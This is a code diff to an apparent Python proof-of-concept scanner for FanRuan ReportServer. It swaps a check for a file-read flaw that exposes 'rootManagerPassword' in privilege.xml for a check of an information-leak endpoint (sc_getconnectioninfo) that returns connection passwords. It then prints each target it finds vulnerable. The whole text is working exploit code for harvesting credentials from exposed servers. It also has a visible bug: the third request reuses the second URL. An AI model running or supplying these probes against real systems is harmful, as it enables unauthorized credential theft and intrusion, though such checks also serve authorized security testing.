@@ -8,16 +8,16 @@ headers = {
 def poc(target):
     try:
         target = get_standard_url(target)
-        url1 = target + "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
-        url2 = target +  "/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
-        url3 = target + "/seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
+        url1 = target + "/ReportServer?op=fr_server&cmd=sc_getconnectioninfo"
+        url2 = target +  "/seeyonreport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo"
+        url3 = target + "/WebReport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo"
 
         res1 = httpx.get(url1,headers=headers)
         res2 = httpx.get(url2,headers=headers)
         res3 = httpx.get(url2, headers=headers)
 
-        if "rootManagerPassword" in res1.text or "rootManagerPassword" in res2.text or "rootManagerPassword" in res3.text:
-            print("\033[0;31m 帆软 文件读取漏洞："+ target )
+        if "password" in res1.text or "password" in res2.text or "password" in res3.text:
+            print("\033[0;31m 帆软 信息泄露漏洞："+ target )
     except:
         pass
 
